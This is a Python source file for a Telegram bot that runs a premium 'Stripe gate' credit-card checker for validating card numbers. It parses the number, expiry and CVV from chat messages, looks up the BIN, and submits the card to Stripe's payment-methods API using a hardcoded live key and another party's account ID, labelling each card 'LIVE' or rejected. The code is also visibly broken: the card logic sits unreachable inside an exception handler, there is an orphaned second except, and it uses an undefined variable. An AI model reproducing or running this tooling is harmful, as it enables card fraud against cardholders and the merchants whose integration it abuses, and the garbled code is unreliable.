import time
import re
import random
import string
import aiohttp
from pyrogram import Client, filters

from values import *  # Define verified_gps(), maindb, antidb, group_not_allowed, buy_premium, user_id, nombre, rol, etc.

waste_cards = [0, 7, 8, 9]  # Ejemplo, define según tus necesidades
banned_bins = set()         # Define tus BINs baneados aquí o cárgalos

def get_time_taken(start):
    return round(time.time() - start, 2)

def get_username():
    # Devuelve un username aleatorio o fijo para el formulario
    return ''.join(random.choices(string.ascii_lowercase, k=8))

@Client.on_message(filters.command(["ch", "chk"], prefixes=[".", "/", "!"]) & filters.text)
async def ch(client, message):
    try:
        started_time = time.time()

        # Extraer datos del usuario
        user_id = message.from_user.id
        nombre = message.from_user.first_name

        # Buscar usuario en base de datos
        find = maindb.find_one({"_id": user_id})
        if not find:
            await message.reply_text(use_not_registered, reply_to_message_id=message.id)
            return

        rol = find.get("status", "")

        # Validar status para uso en privado
        if rol == "F" and message.chat.type == 'private':
            await message.reply_text(buy_premium, reply_to_message_id=message.id)
            return

        # Anti-spam
        antispam_time = antidb.get(user_id)
        if antispam_time:
            antispam_time = int(antispam_time.decode("utf-8"))
        else:
            antispam_time = 0
        spam_time = int(time.time()) - antispam_time

        if rol == "P" and spam_time < 10:
            await message.reply_text(f"<b>AntiSpam: Intenta de nuevo en {10 - spam_time} segundos</b>", reply_to_message_id=message.id)
            return
        elif rol == "F" and spam_time < 60:
            await message.reply_text(f"<b>AntiSpam: Intenta de nuevo en {60 - spam_time} segundos</b>", reply_to_message_id=message.id)
            return

        # Guardar nuevo tiempo de uso
        antidb.set(user_id, str(int(time.time())))

        # Mensaje inicial
        init_text = f"""
<b>【〄】</b> GATE: <b>STRIPE FREE [2]</b>
<b>【〄】</b> PROCESS: <b>□□□□□□□□□□ 0%</b>
<b>【〄】</b> CHECKING BY: <b><a href="tg://user?id={user_id}">{nombre}</a> - {rol}</b>
<b>【〄】</b> TIME TAKING: {round(time.time() - started_time, 2)}'s
<b>【〄】</b> BOT BY: <b>@gsmdiego</b>
"""
        msg = await message.reply_text(text=init_text, reply_to_message_id=message.id)
        await client.send_chat_action(message.chat.id, "typing")

        # Aquí iría la lógica del checker Stripe

    except Exception as e:
        await message.reply_text(f"Ocurrió un error: <code>{e}</code>", reply_to_message_id=message.id)


        # Obtener texto del mensaje para extraer CC
        text_to_check = message.text
        if message.reply_to_message:
            text_to_check = message.reply_to_message.text or text_to_check

        # Extraer números
        input_data = re.findall(r"[0-9]+", text_to_check)

        # Validación de formato CC
        try:
            if len(input_data) == 0:
                raise ValueError("No card data found.")
            
            if len(input_data) == 3:
                cc = input_data[0]
                mes = input_data[1][:2]
                ano = input_data[1][2:]
                cvv = input_data[2]
            else:
                cc, mes, ano, cvv = input_data[:4]
                # Ajuste si mes > 2 dígitos
                if len(mes) > 2:
                    ano, cvv, mes = cvv, mes, ano
        except Exception:
            await msg.edit_text("Your Card Is Incorrect or Empty.")
            return

        # Validaciones específicas
        if int(cc[0]) in waste_cards:
            await msg.edit_text("Your Card Is Invalid.")
            return
        if len(cc) not in [15, 16]:
            await msg.edit_text("Your Card Is Too Short.")
            return
        if len(mes) not in [2, 4] or (len(mes) == 2 and (mes > '12' or mes < '01')):
            await msg.edit_text("Your Card Month Is Incorrect.")
            return
        if (len(ano) not in [2, 4] or
            (len(ano) == 2 and (ano < '21' or ano > '29')) or
            (len(ano) == 4 and (ano < '2021' or ano > '2029'))):
            await msg.edit_text("Your Card Year Is Incorrect.")
            return
        if (int(cc[0]) == 3 and len(cvv) != 4) or len(cvv) not in [3, 4]:
            await msg.edit_text("Your Card CVV Is Incorrect.")
            return

        lista = f"{cc}|{mes}|{ano}|{cvv}"
        bin_number = cc[:6]

        # Consultar BIN asincrónicamente
        async with aiohttp.ClientSession() as session:
            async with session.get(f" https://lookup.binlist.net/{bin_number}") as res:
                if res.status != 200:
                    await msg.edit_text("Your Card BIN lookup failed.")
                    return
                bin_data_json = await res.json()

        if not bin_data_json.get('result', False):
            await msg.edit_text("Your Card Is Invalid.")
            return

        if bin_number + "\n" in banned_bins:
            await msg.edit_text("Your Card Is Banned.")
            return

        bin_data = bin_data_json["data"]
        vendor = bin_data.get("vendor", "").lower()

        # Datos aleatorios para checkout
        async with aiohttp.ClientSession() as session:
            async with session.get("https://randomuser.me/api/?nat=us&inc=name,location") as r:
                random_data = await r.json()

        email = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8)) + '@gmail.com'
        password = ''.join(random.choices(string.ascii_uppercase + string.digits, k=10))

        # Preparar data para stripe payment method
        sk_headers = {
            "Authorization": "Bearer pk_live_1a4WfCRJEoV9QNmww9ovjaR2Drltj9JA3tJEWTBi4Ixmr8t3q5nDIANah1o0SdutQx4lUQykrh9bi3t4dR186AR8P00KY9kjRvX",
            "Content-Type": "application/x-www-form-urlencoded"
        }

        data = (f"type=card&card[number]={cc}&card[cvc]={cvv}&card[exp_month]={mes}&card[exp_year]={ano}"
                "&guid=NA&muid=NA&sid=NA&pasted_fields=number&payment_user_agent=stripe.js%2F583319551%3B+stripe-js-v3%2F583319551"
                "&time_on_page=69254&key=pk_live_1a4WfCRJEoV9QNmww9ovjaR2Drltj9JA3tJEWTBi4Ixmr8t3q5nDIANah1o0SdutQx4lUQykrh9bi3t4dR186AR8P00KY9kjRvX"
                "&_stripe_account=acct_16WRSqINWTSGTB2G")

        async with aiohttp.ClientSession() as session:
            async with session.post("https://api.stripe.com/v1/payment_methods", headers=sk_headers, data=data) as res:
                json_first = await res.json()

        if 'error' in json_first:
            result_text = "REJECTED❌ [INCORRECT CARD]"
        elif 'id' not in json_first:
            result_text = "REJECTED❌ [ERROR]"
        else:
            result_text = None  # Continuar proceso

        if result_text:
            text = f"""
<b>【〄】</b> GATE: <b>STRIPE FREE [2]</b>
<b>【〄】</b> PROCESS: <b>□□□□□□□□□□ 0% </b>
<b>【〄】</b> CHECKING BY: <b><a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a> - {role}</b>
<b>【〄】</b> RESULT: <b>{result_text}</b>
<b>【〄】</b> TIME TAKING: {get_time_taken(started_time)}'s
<b>【〄】</b> BOT BY: <b>@gsmdiego</b>
"""
            await msg.edit_text(text)
            antidb.set(message.from_user.id, int(time.time()))
            return

        # Aquí continuaría la lógica para pagos, creación de clientes, confirmaciones, etc.

        # Finalmente, actualizar mensaje con resultado final
        final_text = f"""
<b>【〄】</b> GATE: <b>STRIPE FREE [2]</b>
<b>【〄】</b> PROCESS: <b>■■■■■■■■■■ 100%</b>
<b>【〄】</b> CHECKING BY: <b><a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a> - {role}</b>
<b>【〄】</b> RESULT: <b>✅ LIVE</b>
<b>【〄】</b> TIME TAKING: {get_time_taken(started_time)}'s
<b>【〄】</b> BOT BY: <b>@gsmdiego</b>
"""
        await msg.edit_text(final_text)
        antidb.set(message.from_user.id, int(time.time()))

    except Exception as e:
        await message.reply_text(f"Error interno: {e}")
